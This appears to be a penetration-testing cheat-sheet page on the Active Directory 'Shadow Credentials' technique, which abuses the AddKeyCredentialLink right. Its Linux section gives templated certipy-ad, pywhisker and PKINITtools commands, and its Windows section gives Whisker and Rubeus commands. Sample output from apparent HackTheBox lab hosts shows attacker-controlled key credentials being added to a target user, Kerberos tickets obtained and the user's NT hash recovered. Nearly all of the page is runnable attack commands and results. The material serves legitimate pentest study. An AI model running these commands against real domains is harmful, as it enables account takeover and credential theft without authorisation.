---
title: "AddKeyCredentialLink"
tags: ["Active Directory", "AddKeyCredentialLink", "AddkeyCredentialLink", "Pass-The-Cert", "Pywhisker", "Shadow Credentials", "Whisker", "Windows"]
---

{{< filter_buttons >}}

### Shadow Credential

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}
{{< tab set1-1 tab1 active >}}certipy-ad{{< /tab >}}{{< tab set1-1 tab2 >}}pywhisker{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

```console {class="password"}
# Password
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -p <PASSWORD> -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -p 'Password123!' -account edward.martin -target DC01.haze.htb -dc-ip 10.129.232.50
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '27690c0aa0d54edaa91a2abc456f98a0'
[*] Adding Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'edward.martin@haze.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'edward.martin.ccache'
File 'edward.martin.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

```console {class="ntlm"}
# NTLM
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -account edward.martin -target DC01.haze.htb -dc-ip 10.129.232.50
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '27690c0aa0d54edaa91a2abc456f98a0'
[*] Adding Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'edward.martin@haze.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'edward.martin.ccache'
File 'edward.martin.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -p <PASSWORD> -k -account <TARGET_USER> -target <DC> -dc-host <DC> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -p 'Password123!' -k -account edward.martin -target DC01.haze.htb -dc-host DC01.haze.htb -dc-ip 10.129.232.50
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '60ceba8fb2f14695975a2e8eb58e58d8'
[*] Adding Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'edward.martin@haze.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'edward.martin.ccache'
[*] Wrote credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -k -account edward.martin -target DC01.haze.htb -dc-host DC01.haze.htb -dc-ip 10.129.232.50
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '60ceba8fb2f14695975a2e8eb58e58d8'
[*] Adding Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'edward.martin@haze.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'edward.martin.ccache'
[*] Wrote credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -k -account edward.martin -target DC01.haze.htb -dc-host DC01.haze.htb -dc-ip 10.129.232.50
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '60ceba8fb2f14695975a2e8eb58e58d8'
[*] Adding Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'edward.martin@haze.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'edward.martin.ccache'
[*] Wrote credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

{{< /tabcontent >}}
{{< tabcontent set1-1 tab2 >}}

#### 1. Add Shadow Credentials

```console {class="password"}
# Password
python3 pywhisker.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
```

```console {class="sample-code"}
$ python3 pywhisker.py --action add -d haze.htb -u 'haze-it-backup$' -p 'Password123!' --dc-ip 10.129.232.50 -t 'edward.martin' --use-ldaps
[*] Searching for the target account
[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
[+] PFX exportiert nach: WYwZ8GQT.pfx
[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

```console {class="ntlm"}
# NTLM
python3 pywhisker.py -d <DOMAIN> -u '<USER>' -H '<HASH>' --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
```

```console {class="sample-code"}
$ python3 pywhisker.py --action add -d haze.htb -u 'haze-it-backup$' -H '735c02c6b2dc54c3c8c6891f55279ebc' --dc-ip 10.129.232.50 -t 'edward.martin' --use-ldaps
[*] Searching for the target account
[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
[+] PFX exportiert nach: WYwZ8GQT.pfx
[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
python3 pywhisker.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
```

```console {class="sample-code"}
$ python3 pywhisker.py -d haze.htb -u 'haze-it-backup$' -p 'Password123!' -k --dc-ip 10.129.232.50 --action add -t 'edward.martin' --use-ldaps
[*] Searching for the target account
[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
[+] PFX exportiert nach: WYwZ8GQT.pfx
[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
python3 pywhisker.py -d <DOMAIN> -u '<USER>' -H '<HASH>' -k --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
```

```console {class="sample-code"}
$ python3 pywhisker.py -d haze.htb -u 'haze-it-backup$' -H '735c02c6b2dc54c3c8c6891f55279ebc' -k --dc-ip 10.129.232.50 --action add -t 'edward.martin' --use-ldaps
[*] Searching for the target account
[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
[+] PFX exportiert nach: WYwZ8GQT.pfx
[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
python3 pywhisker.py -d <DOMAIN> -u '<USER>' -k --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
```

```console {class="sample-code"}
$ python3 pywhisker.py -d haze.htb -u 'haze-it-backup$' -k --dc-ip 10.129.232.50 --action add -t 'edward.martin' --use-ldaps
[*] Searching for the target account
[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
[+] PFX exportiert nach: WYwZ8GQT.pfx
[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

#### 2. Request a Ticket Using the PFX

```console
python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' '<TARGET_USER>.ccache' -dc-ip <DC>
```

```console {class="sample-code"}
$ python3 gettgtpkinit.py -cert-pfx WYwZ8GQT.pfx -pfx-pass 'k9Z5Q2g87lakxIoE7rd2' 'haze.htb/edward.martin' 'edward.martin.ccache' -dc-ip dc01.haze.htb 
2025-10-31 20:24:22,412 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-10-31 20:24:22,420 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-10-31 20:24:36,391 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-10-31 20:24:36,391 minikerberos INFO     62414608995ff5382ef6657aad37038beaa512c8e65de94f3302f1771738acd5
INFO:minikerberos:62414608995ff5382ef6657aad37038beaa512c8e65de94f3302f1771738acd5
2025-10-31 20:24:36,393 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

#### 3. Get NTLM Hash

```console
# Pass-the-ticket
export KRB5CCNAME=<TARGET_USER>.ccache
```

```console
# Get NTLM hash
python3 getnthash.py '<DOMAIN>/<TARGET_USER>' -key <AS_REP_ENC_KEY>
```

```console {class="sample-code"}
$ python3 getnthash.py 'haze.htb/edward.martin' -key 62414608995ff5382ef6657aad37038beaa512c8e65de94f3302f1771738acd5
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

<small>*Ref: [pywhisker](https://github.com/ShutdownRepo/pywhisker)*</small>
<br>
<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}
{{< tab set1-2 tab1 active>}}whisker{{< /tab >}}
{{< tabcontent set1-2 tab1 >}}

#### 1. Add Shadow Credentials

```console
.\whisker.exe add /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC> /password:'<PFX_PASSWORD>'
```

```console {class="sample-code"}
PS C:\programdata> .\whisker.exe add /domain:outdated.htb /target:'sflowers' /dc:10.10.11.175 /password:'Test1234'
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 06a332a6-1ef1-4e73-bb9b-f5e5d1f9e963
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz .---[SNIP]--- TvhwICB9A= /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
```

#### 2. Request a Ticket Using the PFX File and Get NTLM Hash

```console
.\rubeus.exe asktgt /user:'<TARGET_USER>' /certificate:'<BASE64_PFX>' /password:'<PFX_PASSWORD>' /domain:<DOMAIN> /dc:<DC> /getcredentials /show
```

```console {class="sample-code"}
PS C:\programdata> .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz .---[SNIP]--- TvhwICB9A=' /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
[*] Using domain controller: 10.10.11.175:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF0jCCBc ---[SNIP]--- F0ZWQuaHRi

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  sflowers
  UserRealm                :  OUTDATED.HTB
  StartTime                :  9/22/2024 10:57:36 AM
  EndTime                  :  9/22/2024 8:57:36 PM
  RenewTill                :  9/29/2024 10:57:36 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  vqosgxeFibuRzlIPfnejKQ==
  ASREP (key)              :  1E1FB4543905764478F7F129026B67A6

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
```

<small>*Ref: [Whisker.exe](https://github.com/eladshamir/Whisker)*</small>

{{< /tabcontent >}}
{{< /tabcontent >}}